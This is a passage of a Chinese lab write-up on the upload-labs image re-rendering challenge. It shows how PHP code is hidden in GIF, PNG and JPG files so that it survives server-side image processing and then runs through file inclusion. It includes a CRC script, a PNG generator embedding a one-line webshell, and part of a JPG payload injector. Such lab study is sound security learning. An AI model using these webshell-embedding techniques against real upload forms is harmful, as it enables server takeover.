loading="lazy"
&gt;&lt;/p&gt;
&lt;h4 id="文件包含验证"&gt;文件包含验证
&lt;/h4&gt;&lt;p&gt;​ 上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用&lt;code&gt;inclue.php&lt;/code&gt;文件包含访问刚刚上传的文件&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h3 id="其他格式"&gt;其他格式
&lt;/h3&gt;&lt;p&gt;​ 如图成功访问就是图片马上传成功了。但是这个方法我只有&lt;code&gt;jpg&lt;/code&gt;格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解&lt;code&gt;imagecreatefromjpeg&lt;/code&gt;、&lt;code&gt;imagecreatefrompng&lt;/code&gt;、&lt;code&gt;imagecreatefromgif&lt;/code&gt;，这三个函数的原理，让其报错即可。&lt;/p&gt;
&lt;h2 id="第二种方法"&gt;第二种方法
&lt;/h2&gt;&lt;p&gt;​ （windows环境，php版本5.2.17）&lt;/p&gt;
&lt;p&gt;​ 这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。&lt;/p&gt;
&lt;p&gt;​ 用到的工具是&lt;strong&gt;Beyond Compare 4&lt;/strong&gt;，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。&lt;/p&gt;
&lt;h3 id="gif格式"&gt;GIF格式
&lt;/h3&gt;&lt;h4 id="准备并上传-1"&gt;准备并上传
&lt;/h4&gt;&lt;p&gt;​ 上传一个使用&lt;code&gt;copy /b&lt;/code&gt;指令制作的图片马，之前文章第13题用过。假设上传的图片马为&lt;strong&gt;yoo.gif&lt;/strong&gt;，上传成功以后再下载下载的文件名为&lt;strong&gt;2119840023.gif&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h4 id="文件比较"&gt;文件比较
&lt;/h4&gt;&lt;p&gt;​ 使用前面说的&lt;strong&gt;Beyond Compare 4&lt;/strong&gt;工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件&lt;strong&gt;相同&lt;/strong&gt;的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。&lt;code&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/code&gt;的十六进制是&lt;code&gt;3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E&lt;/code&gt;直接粘贴插入，在右边框中右键保存文件再进行上传。&lt;/p&gt;
&lt;h4 id="文件包含验证-1"&gt;文件包含验证
&lt;/h4&gt;&lt;p&gt;​ 上传以后进行文件包含，代码执行成功。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。&lt;/p&gt;
&lt;h3 id="png格式"&gt;png格式
&lt;/h3&gt;&lt;p&gt;​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的&lt;strong&gt;头标识&lt;/strong&gt;部分，修改的话就不是png格式图片，更过不了。&lt;/p&gt;
&lt;p&gt;​ 所以我直接看答案了，还是前言里的&lt;a class="link" href="https://xz.aliyun.com/t/2657#toc-3" target="_blank" rel="noopener"
&gt;博客&lt;/a&gt;。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。&lt;/p&gt;
&lt;p&gt;​ 所以又出来了两种方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;修改CRC码&lt;/li&gt;
&lt;li&gt;直接生成图片&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id="计算crc码"&gt;计算CRC码
&lt;/h4&gt;&lt;p&gt;​ 计算CRC码的&lt;code&gt;python&lt;/code&gt;脚本&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;import binascii
import re
png = open(r&amp;#39;1.png&amp;#39;,&amp;#39;rb&amp;#39;)
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)
&amp;#39;&amp;#39;&amp;#39; PLTE crc &amp;#39;&amp;#39;&amp;#39;
data = &amp;#39;504c5445&amp;#39;+ re.findall(&amp;#39;504c5445(.*?)49444154&amp;#39;,hexstr)[0]
crc = binascii.crc32(data[:-16].decode(&amp;#39;hex&amp;#39;)) &amp;amp; 0xffffffff
print hex(crc)
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id="准备"&gt;准备
&lt;/h5&gt;&lt;p&gt;​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分&lt;strong&gt;写入代码&lt;/strong&gt;，再重新计算CRC码，再修改原来的CRC码即可。&lt;/p&gt;
&lt;h5 id="计算crc码-1"&gt;计算CRC码
&lt;/h5&gt;&lt;p&gt;​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。&lt;/p&gt;
&lt;p&gt;这个方法我没有尝试，因为我不会python。&lt;del&gt;都2020年了还有人不会python，不会吧不会吧&lt;/del&gt;。😒&lt;/p&gt;
&lt;p&gt;等我学会在回来改这一篇吧。&lt;/p&gt;
&lt;h4 id="直接生成图片写入实际数据模块"&gt;直接生成图片（写入实际数据模块）
&lt;/h4&gt;&lt;p&gt;​ 国外大牛的脚本，直接运行就会生成一个图片&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y &amp;lt; sizeof($p); $y += 3) {
$r = $p[$y];
$g = $p[$y+1];
$b = $p[$y+2];
$color = imagecolorallocate($img, $r, $g, $b);
imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,&amp;#39;./1.png&amp;#39;);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为&lt;code&gt;php.exe&lt;/code&gt;的可执行文件，它是php提供的一种&lt;strong&gt;CLI&lt;/strong&gt;模式，也就是&lt;strong&gt;命令行模式&lt;/strong&gt;。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。&lt;/p&gt;
&lt;p&gt;​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。&lt;/p&gt;
&lt;p&gt;​ 运行成功以后会找到一个名为&lt;strong&gt;1.png&lt;/strong&gt;的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。&lt;/p&gt;
&lt;p&gt;​ 但是这个生成的图片php代码是&lt;code&gt;&amp;lt;?=$_GET[0]($_POST[1]);?&amp;gt;&lt;/code&gt;，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，&lt;del&gt;应该算吧&lt;/del&gt;&lt;/p&gt;
&lt;h3 id="jpg格式-1"&gt;jpg格式
&lt;/h3&gt;&lt;p&gt;​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; It is necessary that the size and quality of the initial image are the same as those of the processed image.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; 1) Upload an arbitrary image via secured files upload script
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; 2) Save the processed image and launch:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; jpg_payload.php &amp;lt;jpg_name.jpg&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; Since the most straightforward injection method is used, the following problems can occur:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; 1) After the second processing the injected data may become partially corrupted.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; 2) The jpg_payload.php script outputs &amp;#34;Something&amp;#39;s wrong&amp;#34;.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; Sergey Bobrov @Black2Fan.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; See also:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $miniPayload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt;?=phpinfo();?&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;extension_loaded&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;gd&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;function_exists&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;imagecreatefromjpeg&amp;#39;&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;php-gd is not installed&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;php jpg_payload.php &amp;lt;jpg_name.jpg&amp;gt;&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;set_error_handler&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;custom_error_handler&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt;($pad &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $pad &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1024&lt;/span&gt;; $pad&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $nullbytePayloadSize &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $pad;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $dis &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;DataInputStream&lt;/span&gt;($argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $outStream &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $extraBytes &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $correctImage &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;TRUE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readShort&lt;/span&gt;() &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0xFFD8&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Incorrect SOI marker&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt;((&lt;span style="color:#f92672"&gt;!&lt;/span&gt;$dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;eof&lt;/span&gt;()) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt;() &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0xFF&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $marker &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $size &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readShort&lt;/span&gt;() &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;skip&lt;/span&gt;($size);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($marker &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0xDA&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $startPos &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;seek&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $outStreamTmp &lt;span style="color:#f92672"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, $startPos) &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $miniPayload &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;str_repeat&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\0&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;,$nullbytePayloadSize) &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, $startPos);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;checkImage&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;_&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;], $outStreamTmp, &lt;span style="color:#66d9ef"&gt;TRUE&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($extraBytes &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt;((&lt;span style="color:#f92672"&gt;!&lt;/span&gt;$dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;eof&lt;/span&gt;())) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt;() &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0xFF&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt; &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0x00&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $stopPos &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;seek&lt;/span&gt;() &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $imageStreamSize &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $stopPos &lt;span style="color:#f92672"&gt;-&lt;/span&gt; $startPos;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $outStream &lt;span style="color:#f92672"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, $startPos) &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $miniPayload &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;str_repeat&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\0&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;,$nullbytePayloadSize)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, $startPos, $imageStreamSize),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $nullbytePayloadSize&lt;span style="color:#f92672"&gt;+&lt;/span&gt;$imageStreamSize&lt;span style="color:#f92672"&gt;-&lt;/span&gt;$extraBytes) &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, $stopPos);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;elseif&lt;/span&gt;($correctImage) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $outStream &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $outStreamTmp;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;checkImage&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;payload_&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;], $outStream)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Success!&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
